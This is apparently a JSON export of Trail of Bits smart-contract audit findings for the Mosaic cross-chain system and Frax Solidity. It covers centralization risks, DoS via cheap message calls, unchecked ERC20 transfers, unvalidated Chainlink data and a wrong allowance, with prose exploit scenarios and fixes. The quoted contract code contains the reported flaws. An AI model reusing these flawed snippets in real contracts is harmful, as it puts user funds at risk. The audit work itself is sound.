        "description": "The MosaicVault and MosaicHolding contracts manage many critical functionalities, such as those for rescuing funds, managing liquidity, and claiming rewards. The owner of these contracts is a single externally owned account (EOA). As mentioned in TOB-CMP-20 , this creates a single point of failure. Moreover, it makes the owner a high-value target for attackers and increases the incentives for the owner to act maliciously. If the private key is compromised, the system will be compromised too. Exploit Scenario Alice, the owner of the MosaicVault and MosaicHolding contracts, deploys the contracts. MosaicHolding eventually holds assets worth USD 20 million. Eve gains access to Alices machine, upgrades the implementations, pauses MosaicHolding , and drains all funds from the contract. Recommendations Short term, change the owner of the contracts from a single EOA to a multi-signature account. Long term, take the following steps:   Develop user documentation on all risks associated with the system, including those associated with privileged users and the existence of a single point of failure. Assess the systems key management infrastructure and document the associated risks as well as an incident response plan.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "27. The relayer is a single point of failure ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "description": "Because the relayer is a centralized service that is responsible for critical functionalities, it constitutes a single point of failure within the Mosaic ecosystem. The relayer is responsible for the following tasks:       Managing withdrawals across chains Managing transfers across chains Managing the accrued interest on all users investments Executing cross-chain message call requests Collecting fees for all withdrawals, transfers, and cross-chain message calls Refunding fees in case of failed transfers or withdrawals The centralized design and importance of the relayer increase the likelihood that the relayer will be targeted by an attacker. Exploit Scenario Eve, an attacker, is able to gain root access on the server that runs the relayer. Eve can then shut down the Mosaic system by stopping the relayer service. Eve can also change the source code to trigger behavior that can lead to the drainage of funds. Recommendations Short term, document an incident response plan and monitor exposed ports and services that may be vulnerable to exploitation. Long term, arrange an external security audit of the core and peripheral relayer source code. Additionally, consider implementing a decentralized relayer architecture more resistant to system takeovers.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Project dependencies contain vulnerabilities ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "description": "Although dependency scans did not yield a direct threat to the project under review, npm and yarn audit identied dependencies with known vulnerabilities. Due to the sensitivity of the deployment code and its environment, it is important to ensure dependencies are not malicious. Problems with dependencies in the JavaScript community could have a signicant eect on the repositories under review. The output below details these issues. CVE ID",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "10. DoS risk created by cross-chain message call requests on certain networks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "description": "Cross-chain message calls that are requested on a low-fee, low-latency network could facilitate a DoS, preventing other users from interacting with the system. If a user, through the MsgSender contract, sent numerous cross-chain message call requests, the relayer would have to act upon the emitted events regardless of whether they were legitimate or part of a DoS attack. Exploit Scenario Eve creates a theoretically innite series of transactions on Arbitrum, a low-fee, low-latency network. The internal queue of the relayer is then lled with numerous malicious transactions. Alice requests a cross-chain message call; however, because the relayer must handle many of Eves transactions rst, Alice has to wait an undened amount of time for her transaction to be executed. Recommendations Short term, create multiple queues that work across the various chains to mitigate this DoS risk. Long term, analyze the implications of the ability to create numerous message calls on low-fee networks and its impact on relayer performance.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "12. Unimplemented getAmountsOut function in Balancer V2 ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "description": "The getAmountsOut function in the BalancerV2Wrapper contract is unimplemented. The purpose of the getAmountsOut() function, shown in gure 12.1, is to allow users to know the amount of funds they will receive when executing a swap. Because the function does not invoke any functions on the Balancer Vault, a user must actually perform a swap to determine the amount of funds he or she will receive: function getAmountsOut ( address , address , uint256 , bytes calldata ) external pure override returns ( uint256 ) { return 0 ; } Figure 12.1: The getAmountsOut function in BalancerVaultV2Wrapper:43-50 Exploit Scenario Alice, a user of the Composable Finance vaults, wants to swap 100 USDC for DAI on Balancer. Because the getAmountsOut function is not implemented, she is unable to determine how much DAI she will receive before executing the swap. Recommendations Short term, implement the getAmountsOut function and have it call the queryBatchSwap function on the Balancer Vault. Long term, add unit tests for all functions to test all ows. Unit tests will detect incorrect function behavior.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "28. Lack of events for critical operations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "description": "Several critical operations do not trigger events. As a result, it will be dicult to review the correct behavior of the contracts once they have been deployed. For example, the setRelayer function, which is called in the MosaicVault contract to set the relayer address, does not emit an event providing conrmation of that operation to the contracts caller (gure 28.1). function setRelayer ( address _relayer ) external override onlyOwner { relayer = _relayer; } Figure 28.1: The setRelayer() function in MosaicVault:80-82 Without events, users and blockchain-monitoring systems cannot easily detect suspicious behavior. Exploit Scenario Eve, an attacker, is able to take ownership of the MosaicVault contract. She then sets a new relayer address. Alice, a Composable Finance team member, is unaware of the change and does not raise a security incident. Recommendations Short term, add events for all critical operations that result in state changes. Events aid in contract monitoring and the detection of suspicious behavior. Long term, consider using a blockchain-monitoring system to track any suspicious behavior in the contracts. The system relies on several contracts to behave as expected. A monitoring mechanism for critical events would quickly detect any compromised system components. 30. Insu\u0000cient protection of sensitive information Severity: Medium Diculty: High Type: Conguration Finding ID: TOB-CMP-30 Target: CrosslayerPortal/env , bribe-protocol/hardhat.config.ts",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. Accrued interest is not attributable to the underlying investor on-chain ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "description": "When an investor earns interest-bearing tokens by lending funds through Mosaics investment strategies, the tokens are not directly attributed to the investor by on-chain data. The claim() function, which can be called only by the owner of the MosaicHolding contract, is dened in the contract and used to redeem interest-bearing tokens from protocols such as Aave and Compound (gure 5.1). The underlying tokens of these protocols lending pools are provided by users who are interacting with the Mosaic system and wish to earn rewards on their idle funds. function claim ( address _investmentStrategy , bytes calldata _data) external override onlyAdmin validAddress(_investmentStrategy) { require (investmentStrategies[_investmentStrategy], \"ERR: STRATEGY NOT SET\" ); address rewardTokenAddress = IInvestmentStrategy(_investmentStrategy).claimTokens(_data); emit TokenClaimed(_investmentStrategy, rewardTokenAddress); } Figure 5.1: The claim function in MosaicHolding:270-279 During the execution of claim() , the internal claimTokens() function calls into the AaveInvestmentStrategy , CompoundInvestmentStrategy , or SushiswapLiquidityProvider contract, which eectively transfers its balance of the interest-bearing token directly to the MosaicHolding contract. Figure 5.2 shows the claimTokens() function call in AaveInvestmentStrategy . function claimTokens ( bytes calldata data) external override onlyInvestor returns ( address ) { address token = abi.decode(data, ( address )); ILendingPool lendingPool = ILendingPool(lendingPoolAddressesProvider.getLendingPool()); DataTypes.ReserveData memory reserve = lendingPool.getReserveData(token); IERC20Upgradeable(reserve.aTokenAddress).safeTransfer( mosaicHolding, IERC20Upgradeable(reserve.aTokenAddress).balanceOf( address ( this )) ); return reserve.aTokenAddress; } Figure 5.2: The c laimTokens function in AaveInvestmentStrategy:58-68 However, there is no identiable mapping or data structure attributing a percentage of those rewards to a given user. The o-chain relayer service is responsible for holding such mappings and rewarding users with the interest they have accrued upon withdrawal (see the r elayer bot assumptions in the Project Coverage section). Exploit Scenario Investors Alice and Bob, who wish to earn interest on their idle USDC, decide to use the Mosaic system to provide loans. Mosaic invests their money in Aaves lending pool for USDC. However, there is no way for the parties to discern their ownership stakes in the lending pool through the smart contract logic. The owner of the contract decides to call the claim() function and redeem all aUSDC associated with Alices and Bobs positions. When Bob goes to withdraw his funds, he has to trust that the relayer will send him his claim on the aUSDC without any on-chain verication. Recommendations Short term, consider implementing a way to identify the amount of each investors stake in a given investment strategy. Currently, the relayer is responsible for tracking all rewards. Long term, review the privileges and responsibilities of the relayer and architect a more robust solution for managing investments.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "6. User funds can become trapped in nonstandard token contracts ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "description": "If a users funds are transferred to a token contract that violates the ERC20 standard, the funds may become permanently trapped in that token contract. In the MsgReceiver contract, there are six calls to the transfer() function. See gure 6.1 for an example. function approveERC20TokenAndForwardCall( uint256 _feeAmount, address _feeToken, address _feeReceiver, address _token, uint256 _amount, bytes32 _id, address _contract, bytes calldata _data ) external payable onlyOwnerOrRelayer returns ( bool success, bytes memory returnData) { require ( IMsgReceiverFactory(msgReceiverFactory).whitelistedFeeTokens(_feeToken), \"Fee token is not whitelisted\" ); require (!forwarded[_id], \"call already forwared\" ); //approve tokens to _contract IERC20(_token).safeIncreaseAllowance(_contract, _amount); // solhint-disable-next-line avoid-low-level-calls (success, returnData) = _contract.call{value: msg.value }(_data); require (success, \"Failed to forward function call\" ); uint256 balance = IERC20(_feeToken).balanceOf( address ( this )); require (balance >= _feeAmount, \"Not enough tokens for the fee\" ); forwarded[_id] = true ; IERC20(_feeToken).transfer(_feeReceiver, _feeAmount); } Figure 6.1: The approveERC20TokenAndForwardCall function in MsgReceiver:98- When implemented in accordance with the ERC20 standard, the transfer() function returns a boolean indicating whether a transfer operation was successful. However, tokens that implement the ERC20 interface incorrectly may not return true upon a successful transfer, in which case the transaction will revert and the users funds will be locked in the token contract. Exploit Scenario Alice, the owner of the MsgReceiverFactory contract, adds a fee token that is controlled by Eve. Eves token contract incorrectly implements the ERC20 interface. Bob interacts with MsgReceiver and calls a function that executes a transfer to _feeReceiver , which is controlled by Eve. Because Eves fee token contract does not provide a return value, Bobs transfer reverts. Recommendations Short term, use safeTransfer() for token transfers and use the SafeERC20 library for interactions with ERC20 token contracts. Long term, develop a process for onboarding new fee tokens. Review our Token Integration Checklist for guidance on the onboarding process. References  Missing Return Value Bug",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Use of MsgReceiver to check _feeToken status leads to unnecessary gas consumption ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "description": "Checking the whitelist status of a token only on the receiving end of a message call can lead to excessive gas consumption. As part of a cross-chain message call, all functions in the MsgReceiver contract check whether the token used for the payment to _feeReceiver ( _feeToken ) is a whitelisted token (gure 13.1). Tokens are whitelisted by the owner of the MsgReceiverFactory contract. function approveERC20TokenAndForwardCall( uint256 _feeAmount, address _feeToken, address _feeReceiver, address _token, uint256 _amount, bytes32 _id, address _contract, bytes calldata _data ) external payable onlyOwnerOrRelayer returns ( bool success, bytes memory returnData) { require ( IMsgReceiverFactory(msgReceiverFactory).whitelistedFeeTokens(_feeToken), \"Fee token is not whitelisted\" ); require (!forwarded[_id], \"call already forwared\" ); //approve tokens to _contract IERC20(_token).safeIncreaseAllowance(_contract, _amount); // solhint-disable-next-line avoid-low-level-calls (success, returnData) = _contract.call{value: msg.value }(_data); require (success, \"Failed to forward function call\" ); uint256 balance = IERC20(_feeToken).balanceOf( address ( this )); require (balance >= _feeAmount, \"Not enough tokens for the fee\" ); forwarded[_id] = true ; IERC20(_feeToken).transfer(_feeReceiver, _feeAmount); } Figure 13.1: The approveERC20TokenAndForwardCall function in M sgReceiver:98-123 This validation should be performed before the MsgSender contract emits the related event (gure 13.2). This is because the relayer will act upon the emitted event on the receiving chain regardless of whether _feeToken is set to a whitelisted token. function registerCrossFunctionCallWithTokenApproval( uint256 _chainId, address _destinationContract, address _feeToken, address _token, uint256 _amount, bytes calldata _methodData ) { external override nonReentrant onlyWhitelistedNetworks(_chainId) onlyUnpausedNetworks(_chainId) whenNotPaused bytes32 id = _generateId(); //shouldn't happen require (hasBeenForwarded[id] == false , \"Call already forwarded\" ); require (lastForwardedCall != id, \"Forwarded last time\" ); lastForwardedCall = id; hasBeenForwarded[id] = true ; emit ForwardCallWithTokenApproval( msg.sender , id, _chainId, _destinationContract, _feeToken , _token, _amount, _methodData ); } Figure 13.2: The registerCrossFunctionCallWithTokenApproval function in M sgSender:169-203 Exploit Scenario On Arbitrum, a low-fee network, Eve creates a theoretically innite series of transactions to be sent to MsgSender , with _feeToken set to a token that she knows is not whitelisted. The relayer relays the series of message calls to a MsgReceiver contract on Ethereum, a high-fee network, and all of the transactions revert. However, the relayer has to pay the intrinsic gas cost for each transaction, with no repayment, while allowing its internal queue to be lled up with malicious transactions. Recommendations Short term, move the logic for token whitelisting and validation to the MsgSender contract. Long term, analyze the implications of the ability to create numerous message calls on low-fee networks and its impact on relayer performance.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "14. Active liquidity providers can set arbitrary _tokenOut values when withdrawing liquidity ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "description": "An active liquidity provider (LP) can move his or her liquidity into any token, even one that the LP controls. When a relayer acts upon a WithdrawRequest event triggered by an active LP, the MosaicVault contract checks only that the address of _tokenOut (the token being requested) is not the zero address (gure 14.1). Outside of that constraint, _tokenOut can eectively be set to any token, even one that might have vulnerabilities. function _withdraw( address _accountTo, uint256 _amount, address _tokenIn, address _tokenOut, uint256 _amountOutMin, WithdrawData calldata _withdrawData, bytes calldata _data ) internal onlyWhitelistedToken(_tokenIn) validAddress(_tokenOut) nonReentrant onlyOwnerOrRelayer whenNotPaused returns ( uint256 withdrawAmount) Figure 14.1: The signature of the _withdraw function in M osaicVault:404-419 This places the burden of ensuring the swaps success on the decentralized exchange, and, as the application grows, can lead to unintended code behavior. Exploit Scenario Eve, a malicious active LP, is able to trigger undened behavior in the system by setting _tokenOut to a token that is vulnerable to exploitation. Recommendations Short term, analyze the implications of allowing _tokenOut to be set to an arbitrary token. Long term, validate the assumptions surrounding the lack of limits on _tokenOut as the codebase grows, and review our Token Integration Checklist to identify any related pitfalls. References  imBTC Uniswap Hack",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "15. Withdrawal assumptions may lead to transfers of an incorrect token ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "description": "The CurveTricryptoStrategy contract manages liquidity in Curve pools and facilitates transfers of tokens between chains. While it is designed to work with one curve vault, the vault can be set to an arbitrary pool. Thus, the contract should not make assumptions regarding the pool without validation. Each pool contains an array of tokens specifying the tokens to withdraw from that pool. However, when the vault address is set in the constructor of CurveTricryptoConfig , the pools address is not checked against the TriCrypto pools address. The token at index 2 in the coins array is assumed to be wrapped ether (WETH), as indicated by the code comment shown in gure 15.1. If the conguration is incorrect, a dierent token may be unintentionally transferred. if (unwrap) { //unwrap LP into weth transferredToken = tricryptoConfig.tricryptoLPVault().coins( 2 ); [...] Figure 15.1: Part of the transferLPs function in CurveTricryptoStrategy .sol:377-379 Exploit Scenario The Curve pool array, coins , stores an address other than that of WETH in index 2. As a result, a user mistakenly sends the wrong token in a transfer. Recommendations Short term, have the constructor of CurveTricryptoConfig or the transferLPs function validate that the address of transferredToken is equal to the address of WETH. Long term, validate data from external contracts, especially data involved in the transfer of funds.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "16. Improper validation of Chainlink data ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "description": "The latestRoundData function returns a signed integer that is coerced to an unsigned integer without checking that the value is positive. An overow (e.g., uint(-1) ) would result in drastic misrepresentation of the price and unexpected behavior. In addition, ChainlinkLib does not ensure the completeness or recency of round data, so pricing data may not reect recent changes. It is best practice to dene a window in which data is considered suciently recent (e.g., within a minute of the last update) by comparing the block timestamp to updatedAt . (, int256 price , , , ) = _aggregator.latestRoundData(); return uint256 (price); Figure 16.1: Part of the getCurrentTokenPrice function in ChainlinkLib.sol:113-114 Recommendations Short term, have latestRoundData and similar functions verify that values are non-negative before converting them to unsigned integers, and add an invariant require(updatedAt != 0 && answeredInRound == roundID) to ensure that the round has nished and that the pricing data is from the current round. Long term, dene a minimum update threshold and add the following check: require((block.timestamp - updatedAt <= minThreshold) && (answeredInRound == roundID)) .",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "25. Incorrect safeIncreaseAllowance() amount can cause invest() calls to revert ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "description": "Calls to make investments through Sushiswap can revert because the sushiSwapRouter may not have the token allowances needed to fulll the requests. The owner of the MosaicHolding contract is responsible for investing user-deposited funds in investment strategies. The contract owner does this by calling the contracts invest() function, which then calls makeInvestment() on the investment strategy meant to receive the funds (gure 25.1). function invest ( IInvestmentStrategy.Investment[] calldata _investments, address _investmentStrategy , bytes calldata _data ) external override onlyAdmin validAddress(_investmentStrategy) { require (investmentStrategies[_investmentStrategy], \"ERR: STRATEGY NOT SET\" ); uint256 investmentsLength = _investments.length; address contractAddress = address ( this ); for ( uint256 i ; i < investmentsLength; i++) { IInvestmentStrategy.Investment memory investment = _investments[i]; require (investment.amount != 0 && investment.token != address ( 0 ), \"ERR: TOKEN AMOUNT\" ); IERC20Upgradeable token = IERC20Upgradeable(investment.token); require (token.balanceOf(contractAddress) >= investment.amount, \"ERR: BALANCE\" ); token.safeApprove(_investmentStrategy, investment.amount); } uint256 mintedTokens = IInvestmentStrategy(_investmentStrategy).makeInvestment( _investments, _data ); emit FoundsInvested(_investmentStrategy, msg.sender , mintedTokens); } Figure 25.1: The invest function in MosaicHolding:190- To deposit funds into the SushiswapLiquidityProvider investment strategy, the contract must increase the sushiSwapRouter s approval limits to account for the tokenA and tokenB amounts to be transferred. However, tokenB s approval limit is increased only to the amount of the tokenA investment (gure 25.2). function makeInvestment (Investment[] calldata _investments, bytes calldata _data) external override onlyInvestor nonReentrant returns ( uint256 ) { Investment memory investmentA = _investments[ 0 ]; Investment memory investmentB = _investments[ 1 ]; IERC20Upgradeable tokenA = IERC20Upgradeable(investmentA.token); IERC20Upgradeable tokenB = IERC20Upgradeable(investmentB.token); tokenA.safeTransferFrom( msg.sender , address ( this ), investmentA.amount); tokenB.safeTransferFrom( msg.sender , address ( this ), investmentB.amount); tokenA.safeIncreaseAllowance( address (sushiSwapRouter), investmentA.amount); tokenB.safeIncreaseAllowance( address (sushiSwapRouter), investmentA.amount); ( uint256 deadline , uint256 minA , uint256 minB ) = abi.decode( _data, ( uint256 , uint256 , uint256 ) ); (, , uint256 liquidity ) = sushiSwapRouter.addLiquidity( investmentA.token, investmentB.token, investmentA.amount, investmentB.amount, minA, minB, address ( this ), deadline ); return liquidity; } Figure 25.2: The makeInvestment function in SushiswapLiquidityProvider : 52-85 If the amount of tokenB to be deposited is greater than that of tokenA , sushiSwapRouter will fail to transfer the tokens, and the transaction will revert. Exploit Scenario Alice, the owner of the MosaicHolding contract, wishes to invest liquidity in a Sushiswap liquidity pool. The amount of the tokenB investment is greater than that of tokenA . The sushiSwapRouter does not have the right token allowances for the transaction, and the investment request fails. Recommendations Short term, change the amount value used in the safeIncreaseAllowance() call from investmentA.amount to investmentB.amount . Long term, review the codebase to identify similar issues. Additionally, create a more extensive test suite capable of testing edge cases that may invalidate system assumptions.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "17. Incorrect check of token status in the providePassiveLiquidity function ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "description": "A passive LP can provide liquidity in the form of a token that is not whitelisted. The providePassiveLiquidity() function in MosaicVault is called by users who wish to participate in the Mosaic system as passive LPs. As part of the functions execution, it checks whether there is a ReceiptToken associated with the _tokenAddress input parameter (gure 17.1). This is equivalent to checking whether the token is whitelisted by the system. function providePassiveLiquidity( uint256 _amount, address _tokenAddress) external payable override nonReentrant whenNotPaused { require (_amount > 0 || msg.value > 0 , \"ERR: AMOUNT\" ); if ( msg.value > 0 ) { require ( vaultConfig.getUnderlyingIOUAddress(vaultConfig.wethAddress()) != address ( 0 ), \"ERR: WETH NOT WHITELISTED\" ); _provideLiquidity( msg.value , vaultConfig.wethAddress(), 0 ); } else { require (_tokenAddress != address ( 0 ), \"ERR: INVALID TOKEN\" ); require ( vaultConfig.getUnderlyingIOUAddress(_tokenAddress) != address ( 0 ), \"ERR: TOKEN NOT WHITELISTED\" ); _provideLiquidity(_amount, _tokenAddress, 0 ); } } Figure 17.1: The providePassiveLiquidity function in MosaicVault:127-149 However, providePassiveLiquidity() uses an incorrect function call to check the whitelist status. Instead of calling getUnderlyingReceiptAddress() , it calls getUnderlyingIOUAddress() . The same issue occurs in checks of WETH deposits. Exploit Scenario Eve decides to deposit liquidity in the form of a token that is whitelisted only for active LPs. The token provides a higher yield than the tokens whitelisted for passive LPs. This may enable Eve to receive a higher annual percentage yield on her deposit than other passive LPs in the system receive on theirs. Recommendations Short term, change the function called to validate tokenAddress and wethAddress from getUnderlyingIOUAddress() to getUnderlyingReceiptAddress() . Long term, take the following steps:    Review the codebase to identify similar errors. Consider whether the assumption that the same tokens will be whitelisted for both passive and active LPs will hold in the future. Create a more extensive test suite capable of testing edge cases that may invalidate system assumptions.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "18. Solidity compiler optimizations can be problematic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "description": "The Composable Finance contracts have enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past . A high-severity bug in the emscripten -generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6 . More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-js causes a security vulnerability in the Composable Finance contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "19. Lack of contract documentation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "description": "The codebases lack code documentation, high-level descriptions, and examples, making the contracts dicult to review and increasing the likelihood of user mistakes. The CrosslayerPortal codebase would benet from additional documentation, including on the following:       The logic responsible for setting the roles in the core and the reason for the manipulation of indexes The incoming function arguments and the values used on source chains and destination chains The arithmetic involved in reward calculations and the relayers distribution of tokens The checks performed by the o-chain components, such as the relayer and the rebalancing bot The third-party integrations The rebalancing arithmetic and calculations There should also be clear NatSpec documentation on every function, identifying the unit of each variable, the functions intended use, and the functions safe values. The documentation should include all expected properties and assumptions relevant to the aforementioned aspects of the codebase. Recommendations Short term, review and properly document the aforementioned aspects of the codebase. Long term, consider writing a formal specication of the protocol.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "21. Unnecessary complexity due to interactions with native and smart contract tokens ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "description": "The Composable Finance code is needlessly complex and has excessive branching. Its complexity largely results from the integration of both ERC20s and native tokens (i.e., ether). Creating separate functions that convert native tokens to ERC20s and then interact with functions that must receive ERC20 tokens (i.e., implementing separation of concerns) would drastically simplify and optimize the code. This complexity is the source of many bugs and increases the gas costs for all users whether or not they need to distinguish between ERC20s and ether. It is best practice to make components as small as possible and to separate helpful but noncritical components into periphery contracts. This reduces the attack surface and improves readability. Figure 21.1 shows an example of complex code. if (tempData.isSlp) { IERC20(sushiConfig.slpToken()).safeTransfer( msg.sender , tempData.slpAmount ); [...] } else { //unwrap and send the right asset [...] if (tempData.isEth) { [...] } else { IERC20(sushiConfig.wethToken()).safeTransfer( Figure 21.1: Part of the withdraw function in SushiSlpStrategy.sol:L180-L216 Recommendations Short term, remove the native ether interactions and use WETH instead. Long term, minimize the function complexity by breaking functions into smaller units. Additionally, refactor the code with minimalism in mind and extend the core functionality into periphery contracts.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "29. Use of legacy openssl version in CrosslayerPortal tests ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "description": "The CrosslayerPortal project uses a legacy version of openssl to run tests. While this version is not exposed in production, the use of outdated security protocols may be risky (gure 29.1). An unexpected error occurred: Error: error:0308010C:digital envelope routines::unsupported at new Hash (node:internal/crypto/hash:67:19) at Object.createHash (node:crypto:130:10) at hash160 (~/CrosslayerPortal/node_modules/ethereum-cryptography/vendor/hdkey-without-crypto.js:249:21 ) at HDKey.set (~/CrosslayerPortal/node_modules/ethereum-cryptography/vendor/hdkey-without-crypto.js:50:24) at Function.HDKey.fromMasterSeed (~/CrosslayerPortal/node_modules/ethereum-cryptography/vendor/hdkey-without-crypto.js:194:20 ) at deriveKeyFromMnemonicAndPath (~/CrosslayerPortal/node_modules/hardhat/src/internal/util/keys-derivation.ts:21:27) at derivePrivateKeys (~/CrosslayerPortal/node_modules/hardhat/src/internal/core/providers/util.ts:29:52) at normalizeHardhatNetworkAccountsConfig (~/CrosslayerPortal/node_modules/hardhat/src/internal/core/providers/util.ts:56:10) at createProvider (~/CrosslayerPortal/node_modules/hardhat/src/internal/core/providers/construction.ts:78:59) at ~/CrosslayerPortal/node_modules/hardhat/src/internal/core/runtime-environment.ts:80:28 { opensslErrorStack: [ 'error:03000086:digital envelope routines::initialization error' ], library: 'digital envelope routines', reason: 'unsupported', code: 'ERR_OSSL_EVP_UNSUPPORTED' } Figure 29.1: Errors agged in npx hardhat testing Recommendations Short term, refactor the code to use a new version of openssl to prevent the exploitation of openssl vulnerabilities. Long term, avoid using outdated or legacy versions of dependencies. 22. Commented-out and unimplemented conditional statements Severity: Undetermined Diculty: Low Type: Undened Behavior Finding ID: TOB-CMP-22 Target: apyhunter-tricrypto/contracts/sushiswap/SushiSlpStrategy.sol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "23. Error-prone NFT management in the Summoner contract ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf",
        "description": "The Summoner contracts ability to hold NFTs in a number of states may create confusion regarding the contracts states and the dierences between the contracts. For instance, the Summoner contract can hold the following kinds of NFTs:   NFTs that have been pre-minted by Composable Finance and do not have metadata attached to them Original NFTs that have been locked by the Summoner for minting on the destination chain  MosaicNFT wrapper tokens, which are copies of NFTs that have been locked and are intended to be minted on the destination chain As the system is scaled, the number of NFTs held by the Summoner , especially the number of pre-minted NFTs, will increase signicantly. Recommendations Simplify the NFT architecture; see the related recommendations in Appendix E .",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Testing is not routine ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "description": "The Frax Solidity repository does not have reproducible tests that can be run locally. Having reproducible tests is one of the best ways to ensure a codebases functional correctness. This nding is based on the following events:    We tried to carry out the instructions in the Frax Solidity README at commit 31dd816 . We were unsuccessful. We reached out to Frax Finance for assistance. Frax Finance in turn pushed eight additional commits to the Frax Solidity repository (not counting merge commits). With these changes, we were able to run some of the tests, but not all of them. These events suggest that tests require substantial eort to run (as evidenced by the eight additional commits), and that they were not functional at the start of the assessment. Exploit Scenario Eve exploits a aw in a Frax Solidity contract. The aw would likely have been revealed through unit tests. Recommendations Short term, develop reproducible tests that can be run locally for all contracts. A comprehensive set of unit tests will help expose errors, protect against regressions, and provide a sort of documentation to users. Long term, incorporate unit testing into the CI process:   Run the tests specic to contract X when a push or pull request aects contract X. Run all tests before deploying any new code, including updates to existing contracts. Automating the testing process will help ensure the tests are run regularly and consistently.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "2. No clear mapping from contracts to tests ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FraxQ42021.pdf",
        "description": "There are 405 Solidity les within the contracts folder 1 , but there are only 80 les within the test folder 2 . Thus, it is not clear which tests correspond to which contracts. The number of contracts makes it impractical for a developer to run all tests when working on any one contract. Thus, to test a contract eectively, a developer will need to know which tests are specic to that contract. Furthermore, as per TOB-FRSOL-001 , we recommend that the tests specic to contract X be run when a push or pull request aects contract X. To apply this recommendation, a mapping from the contracts to their relevant tests is needed. Exploit Scenario Alice, a Frax Finance developer, makes a change to a Frax Solidity contract. Alice is unable to determine the le that should be used to test the contract and deploys the contract untested. The contract is exploited using a bug that would have been revealed by a test. Recommendations Short term, for each contract, produce a list of tests that exercise that contract. If any such list is empty, produce tests for that contract. Having such lists will help facilitate contract testing following a change to it. Long term, as per TOB-FRSOL-001 , incorporate unit testing into the CI process by running the tests specic to contract X when a push or pull request aects contract X. Automating the testing process will help ensure the tests are run regularly and consistently. 1 find contracts -name '*.sol' | wc -l 